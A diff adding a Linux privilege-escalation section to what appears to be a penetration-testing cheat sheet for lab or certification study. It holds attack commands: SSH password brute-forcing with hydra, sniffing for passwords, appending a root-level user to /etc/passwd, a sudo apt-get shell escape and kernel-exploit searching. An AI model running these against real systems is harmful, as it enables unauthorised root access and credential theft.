@@ -229,3 +229,122 @@ impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955ab
 ### SMB Relay
 
 Similar to Responder Capture, but change filename in an uploader to `\\\\[responder-ip]\\test`
+
+# Privilege Escalation
+
+## Linux
+
+### Automated Enumeration
+
+Use `/usr/bin/unix-privsc-check` on the target with `./unix-privesc-check standard > output.txt`
+
+### Manual Enumeration 
+
+Gather OS/User info with commands:
+```
+id
+cat /etc/passwd
+hostname
+cat /etc/issue
+cat /etc/os-release
+uname -a
+```
+
+List running processes: `ps -aux`
+
+Print routing table: `routel`
+
+Network details: `ss -anp`
+
+List cron all jobs: `ls -lah /etc/cron*`
+
+Edit user Crontab file: `crontab -l`
+
+Edit Sudo Crontab file: `sudo crontab -l`
+
+List Installed Debian Packages: `dpkg -l`
+
+List Writable Directories: `find / -writable -type d 2>/dev/null`
+
+List Mounted Drives: `cat /etc/fstab`
+
+List Available Disks: `lsblk`
+
+List Kernel Modules: `lsmod` or `/sbin/modinfo libata`
+
+List SUID Binaries: `find / -perm -u=s -type f 2>/dev/null`
+
+-------------------------------------------------------
+
+### Inspecting User Trails
+
+Check Env Vars: `env`
+
+Check User Login Script: `cat ~/.bashrc`
+
+Create Custom Wordlist for Possible Passwds: `crunch 6 6 -t Lab%%% > wordlist` yields Lab000-Lab999
+
+SSH Guessing with custom Wordlist: `hydra -l eve -P wordlist  192.168.50.214 -t 4 ssh -V`
+
+Sudoer info: `sudo -l`
+
+### Inspecting Service Footprints
+
+Watch process (ps) spawns: `watch -n 1 "ps -aux | grep pass"`
+
+Capture packets to target: `sudo tcpdump -i lo -A | grep "pass"`
+
+### Cron Job Abuse
+
+List cron all jobs: `ls -lah /etc/cron*`
+
+Search for Cronjob evidence: `grep "CRON" /var/log/syslog` or `cat /var/log/cron.log`
+
+### Make Yourself a User
+
+Is `/etc/passwd` writable??
+
+Make a `/etc/passwd` entry:
+
+```
+openssl passwd w00t
+echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
+su root2
+```
+
+### Suid Binaries
+
+Find SUIDs: `find / -perm -u=s -type f 2>/dev/null`
+
+Find Misconfigs: `/usr/sbin/getcap -r / 2>/dev/null`
+
+### Sudo Abuse
+
+Find nopass SUDO: `sudo -l`
+
+Now, lets say `sudo -l` yields `/usr/bin/apt-get`
+
+GTFO bins gives the lines to privesc: 
+```
+sudo apt-get changelog apt
+!/bin/sh
+```
+If fail, check for apparmor denial: `cat /var/log/syslog | grep tcpdump`
+
+### Kernel Vulnerabilities
+
+Gather info: 
+```
+cat /etc/issue
+uname -r
+arch
+```
+Search for Exploits: `searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"`
+
+Try to compile exploits ON THE TARGET if possible!
+
+
+
+## Windows
+
+
